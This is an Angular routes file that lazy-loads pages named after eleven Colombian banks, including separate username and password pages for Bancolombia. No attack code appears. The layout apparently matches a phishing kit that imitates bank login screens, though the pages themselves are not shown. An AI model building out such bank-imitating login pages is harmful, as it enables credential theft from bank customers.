import { Routes } from '@angular/router';

export const routes: Routes = [
    {
        path: 'bancolombia-user',
        loadComponent: () => import('./shared/bancolombiaUser/bancolombiaUser.component')
    },
    {
        path: 'bancolombia-pass',
        loadComponent: () => import('./shared/bancolombiaPass/bancolombiaPass.component')
    },
    {
        path: 'bancolombia-movil',
        loadComponent: () => import('./pages/bancolombia-movil/bancolombia-movil.component')
    },
    {
        path: 'avvillas',
        loadComponent: () => import('./pages/bancoavvillas/bancoavvillas.component')
    },
    {
        path: 'colpatria',
        loadComponent: () => import('./pages/bancocolpatria/bancocolpatria.component')
    },
    {
        path: 'bancobogota',
        loadComponent: () => import('./pages/bancobogota/bancobogota.component')
    },
    {
        path: 'bancobbva',
        loadComponent: () => import('./pages/bancobbva/bancoBbva.component')
    }
    ,
    {
        path: 'davivienda',
        loadComponent: () => import('./pages/bancodavivienda/bancoDavivienda.component')
    },
    {
        path: 'bancooccidente',
        loadComponent: () => import('./pages/bancooccidente/bancoOccidente.component')
    },
    {
        path: 'bancopopular',
        loadComponent: () => import('./pages/bancopopular/bancoPopular.component')
    },
    {
        path: 'bancoserfinanza',
        loadComponent: () => import('./pages/bancoserfinanza/bancoSerfinanza.component')
    }
];
